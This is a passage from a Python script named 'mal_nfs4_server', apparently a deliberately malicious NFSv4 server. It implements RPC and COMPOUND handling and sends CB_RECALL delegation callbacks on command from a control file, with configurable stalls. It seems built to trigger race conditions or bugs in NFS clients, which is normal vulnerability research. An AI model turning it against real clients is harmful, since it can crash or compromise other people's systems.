    OP_GETATTR: HANDLERS.op_GETATTR,
    OP_ACCESS: HANDLERS.op_ACCESS,
    OP_OPEN: HANDLERS.op_OPEN,
    OP_OPEN_CONFIRM: HANDLERS.op_OPEN_CONFIRM,
    OP_OPEN_DOWNGRADE: HANDLERS.op_OPEN_DOWNGRADE,
    OP_CLOSE: HANDLERS.op_CLOSE,
    OP_READ: HANDLERS.op_READ,
    OP_WRITE: HANDLERS.op_WRITE,
    OP_COMMIT: HANDLERS.op_COMMIT,
    OP_READDIR: HANDLERS.op_READDIR,
    OP_SECINFO: HANDLERS.op_SECINFO,
    OP_SETCLIENTID: HANDLERS.op_SETCLIENTID,
    OP_SETCLIENTID_CONFIRM: HANDLERS.op_SETCLIENTID_CONFIRM,
    OP_RENEW: HANDLERS.op_RENEW,
    OP_DELEGRETURN: HANDLERS.op_DELEGRETURN,
    OP_NVERIFY: HANDLERS.op_NVERIFY,
    OP_VERIFY: HANDLERS.op_VERIFY,
}


# ----------------------------------------------------------------------------
# COMPOUND processing
# ----------------------------------------------------------------------------
def process_compound(peer, r):
    """Parse & execute a COMPOUND. Return bytes of the COMPOUND reply body
    (starting at status)."""
    tag = r.string()
    minorversion = r.u32()
    numops = r.u32()
    log("COMPOUND tag=%r minorversion=%d numops=%d" % (tag, minorversion, numops))

    ctx = CompoundCtx(peer)
    results = XDRWriter()   # accumulates per-op results
    nresults = 0
    compound_status = NFS4_OK

    for i in range(numops):
        try:
            opnum = r.u32()
        except XDRError:
            log("  ! could not read opnum #%d (truncated compound)" % i)
            break
        opname = OPNAME.get(opnum, "UNKNOWN(%d)" % opnum)
        handler = OP_DISPATCH.get(opnum)

        opw = XDRWriter()   # this op's result body (after status)
        if handler is None:
            log("  op[%d] %s opnum=%d -> NFS4ERR_NOTSUPP (UNIMPLEMENTED). "
                "raw_remaining=%s" % (i, opname, opnum, hexb(r.buf[r.off:])))
            status = NFS4ERR_NOTSUPP
        else:
            log("  op[%d] %s opnum=%d" % (i, opname, opnum))
            try:
                status = handler(ctx, r, opw)
            except XDRError as e:
                log("  op[%d] %s XDR error: %s -> NFS4ERR_BADXDR" %
                    (i, opname, e))
                status = NFS4ERR_BADXDR
            except Exception as e:
                log("  op[%d] %s EXCEPTION: %s\n%s" %
                    (i, opname, e, traceback.format_exc()))
                status = NFS4ERR_SERVERFAULT

        # append resop: opnum, status, [body if OK]
        results.u32(opnum)
        results.u32(status)
        if status == NFS4_OK:
            results.out += opw.out
        nresults += 1

        if status != NFS4_OK:
            compound_status = status
            log("  -> stop-on-error: op %s returned status=%d" %
                (opname, status))
            break

    # Build compound4res: status, tag, numresults, resarray
    out = XDRWriter()
    out.u32(compound_status)
    out.string(tag)
    out.u32(nresults)
    out.out += results.out
    return out.bytes()


# ----------------------------------------------------------------------------
# RPC message handling
# ----------------------------------------------------------------------------
def build_accepted_reply(xid, accept_stat, results=b"", lo=0, hi=0):
    w = XDRWriter()
    w.u32(xid)
    w.u32(REPLY)
    w.u32(MSG_ACCEPTED)
    # verf = AUTH_NONE, len 0
    w.u32(AUTH_NONE)
    w.u32(0)
    w.u32(accept_stat)
    if accept_stat == PROG_MISMATCH:
        w.u32(lo)
        w.u32(hi)
    w.out += results
    return w.bytes()


def build_denied_reply(xid, auth_stat=1):
    # RPC_MISMATCH not needed; AUTH_ERROR
    w = XDRWriter()
    w.u32(xid)
    w.u32(REPLY)
    w.u32(MSG_DENIED)
    w.u32(1)  # reject_stat = AUTH_ERROR
    w.u32(auth_stat)
    return w.bytes()


def handle_rpc_message(peer, msg):
    """Parse one RPC call, return the reply bytes (or None to drop)."""
    r = XDRReader(msg)
    xid = r.u32()
    mtype = r.u32()
    if mtype != CALL:
        log("RPC xid=0x%x not a CALL (mtype=%d), ignoring" % (xid, mtype))
        return None
    rpcvers = r.u32()
    prog = r.u32()
    vers = r.u32()
    proc = r.u32()
    # credentials
    cred_flavor = r.u32()
    cred_body = r.opaque()
    verf_flavor = r.u32()
    verf_body = r.opaque()

    log("RPC xid=0x%x prog=%d vers=%d proc=%d cred_flavor=%d(%dB) "
        "verf_flavor=%d" % (xid, prog, vers, proc, cred_flavor,
                            len(cred_body), verf_flavor))

    if rpcvers != 2:
        log("  bad rpcvers=%d" % rpcvers)
        return build_accepted_reply(xid, PROG_UNAVAIL)

    if cred_flavor not in (AUTH_NONE, AUTH_SYS):
        log("  rejecting auth flavor=%d" % cred_flavor)
        return build_denied_reply(xid, auth_stat=1)  # AUTH_BADCRED

    if prog != NFS_PROG:
        log("  PROG_UNAVAIL prog=%d" % prog)
        return build_accepted_reply(xid, PROG_UNAVAIL)
    if vers != NFS_VERS:
        log("  PROG_MISMATCH vers=%d" % vers)
        return build_accepted_reply(xid, PROG_MISMATCH, lo=4, hi=4)

    if proc == NFSPROC4_NULL:
        log("  NFSPROC4_NULL")
        return build_accepted_reply(xid, SUCCESS, b"")
    if proc == NFSPROC4_COMPOUND:
        try:
            body = process_compound(peer, r)
        except XDRError as e:
            log("  COMPOUND parse XDRError: %s\n%s" %
                (e, traceback.format_exc()))
            # Best-effort: reply GARBAGE_ARGS
            return build_accepted_reply(xid, GARBAGE_ARGS)
        except Exception as e:
            log("  COMPOUND EXCEPTION: %s\n%s" % (e, traceback.format_exc()))
            return build_accepted_reply(xid, GARBAGE_ARGS)
        return build_accepted_reply(xid, SUCCESS, body)

    log("  PROC_UNAVAIL proc=%d" % proc)
    return build_accepted_reply(xid, PROC_UNAVAIL)


# ----------------------------------------------------------------------------
# Per-connection thread
# ----------------------------------------------------------------------------
def connection_thread(sock, peer):
    log("=== connection from %s ===" % (peer,))
    try:
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        while True:
            msg = recv_record(sock)
            if msg is None:
                log("=== connection %s closed ===" % (peer,))
                return
            try:
                reply = handle_rpc_message(peer, msg)
            except Exception as e:
                log("handle_rpc_message crashed: %s\n%s" %
                    (e, traceback.format_exc()))
                reply = None
            if reply is not None:
                send_record(sock, reply)
    except (ConnectionResetError, BrokenPipeError) as e:
        log("=== connection %s reset: %s ===" % (peer, e))
    except Exception as e:
        log("connection_thread(%s) EXCEPTION: %s\n%s" %
            (peer, e, traceback.format_exc()))
    finally:
        try:
            sock.close()
        except Exception:
            pass


# ----------------------------------------------------------------------------
# CALLBACK CLIENT: fire CB_RECALL on the client's callback channel
# ----------------------------------------------------------------------------
def fire_cb_recall():
    cb_program, cb_ip, cb_port, cb_ident = STATE.snapshot_cb()
    if cb_program is None or cb_ip is None or cb_port is None:
        log("!! fire_cb_recall: no callback channel known yet "
            "(SETCLIENTID not seen). cb_program=%s ip=%s port=%s"
            % (cb_program, cb_ip, cb_port))
        return False

    with STATE.lock:
        deleg_seq = STATE.deleg_seqid

    log(">> firing CB_RECALL to %s:%d (cb_program=%d ident=%d deleg_seq=%d)"
        % (cb_ip, cb_port, cb_program, cb_ident, deleg_seq))

    # Build CB_COMPOUND4args: tag, minorversion, callback_ident, numops, ops[]
    argw = XDRWriter()
    argw.string("cb")
    argw.u32(0)                 # minorversion
    argw.u32(cb_ident)          # callback_ident
    argw.u32(1)                 # numops
    #   op CB_RECALL(4): cb_recall4 { stateid, truncate, fh }
    argw.u32(OP_CB_RECALL)
    argw.u32(deleg_seq)                 # stateid.seqid
    argw.fopaque(DELEG_STATE_OTHER)     # stateid.other (12)
    argw.boolean(False)                 # truncate = FALSE
    argw.opaque(TARGET_FH)              # fh
    cb_args = argw.bytes()

    # Build RPC call: xid, CALL, rpcvers=2, prog=cb_program, vers=1, proc=1
    callw = XDRWriter()
    xid = random.getrandbits(32)
    callw.u32(xid)
    callw.u32(CALL)
    callw.u32(2)                # rpcvers
    callw.u32(cb_program)       # cb program
    callw.u32(1)                # vers = 1
    callw.u32(CB_COMPOUND)      # proc = 1
    # cred = AUTH_NONE
    callw.u32(AUTH_NONE)
    callw.u32(0)
    # verf = AUTH_NONE
    callw.u32(AUTH_NONE)
    callw.u32(0)
    callw.out += cb_args
    call_msg = callw.bytes()

    try:
        cs = socket.create_connection((cb_ip, cb_port), timeout=10)
    except Exception as e:
        log("!! CB connect to %s:%d failed: %s" % (cb_ip, cb_port, e))
        return False
    try:
        cs.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        send_record(cs, call_msg)
        log(">> CB_RECALL sent (xid=0x%x, %d bytes)" % (xid, len(call_msg)))
        cs.settimeout(10)
        reply = recv_record(cs)
        if reply is None:
            log(">> CB_RECALL: no reply (client closed)")
        else:
            log(">> CB_RECALL reply (%d bytes): %s" %
                (len(reply), hexb(reply, 128)))
        return True
    except Exception as e:
        log("!! CB_RECALL send/recv error: %s\n%s" %
            (e, traceback.format_exc()))
        return False
    finally:
        try:
            cs.close()
        except Exception:
            pass


# ----------------------------------------------------------------------------
# Control-file watcher: 'recall' -> fire CB_RECALL; 'quit' -> exit
# ----------------------------------------------------------------------------
def ctl_watcher():
    log("ctl watcher: polling %s every 50ms (write 'recall' or 'quit')"
        % CTL_PATH)
    while True:
        try:
            if os.path.exists(CTL_PATH):
                with open(CTL_PATH, "r") as f:
                    cmd = f.read().strip().lower()
                if cmd:
                    log("ctl: read command %r" % cmd)
                    # clear immediately so it fires once
                    try:
                        open(CTL_PATH, "w").close()
                    except Exception:
                        pass
                    if cmd == "recall":
                        threading.Thread(target=fire_cb_recall,
                                         name="cb-recall",
                                         daemon=True).start()
                    elif cmd == "quit":
                        log("ctl: quit -> exiting")
                        os._exit(0)
                    else:
                        log("ctl: unknown command %r (use recall|quit)" % cmd)
        except Exception as e:
            log("ctl watcher error: %s" % e)
        time.sleep(0.05)


# ----------------------------------------------------------------------------
# main
# ----------------------------------------------------------------------------
def main():
    log("========================================================")
    log("mal_nfs4_server starting: bind %s:%d stall=%dms pid=%d"
        % (BIND_HOST, BIND_PORT, STALL_MS, os.getpid()))
    log("ctl=%s log=%s" % (CTL_PATH, LOG_PATH))
    # ensure ctl exists empty
    try:
        if not os.path.exists(CTL_PATH):
            open(CTL_PATH, "w").close()
    except Exception:
        pass

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind((BIND_HOST, BIND_PORT))
    except PermissionError:
        log("!! bind %s:%d permission denied. Use a port >1024 via "
            "NFS_BIND_PORT, or run appropriately." % (BIND_HOST, BIND_PORT))
        sys.exit(1)
    except OSError as e:
        log("!! bind failed: %s" % e)
        sys.exit(1)
    srv.listen(64)
    log("listening on %s:%d" % (BIND_HOST, BIND_PORT))

    threading.Thread(target=ctl_watcher, name="ctl", daemon=True).start()

    conn_i = 0
    try:
        while True:
            client, peer = srv.accept()
            conn_i += 1
            t = threading.Thread(target=connection_thread,
                                 args=(client, peer),
                                 name="conn-%d" % conn_i,
                                 daemon=True)
            t.start()
    except KeyboardInterrupt:
        log("KeyboardInterrupt -> shutting down")
    finally:
        srv.close()


if __name__ == "__main__":
    main()
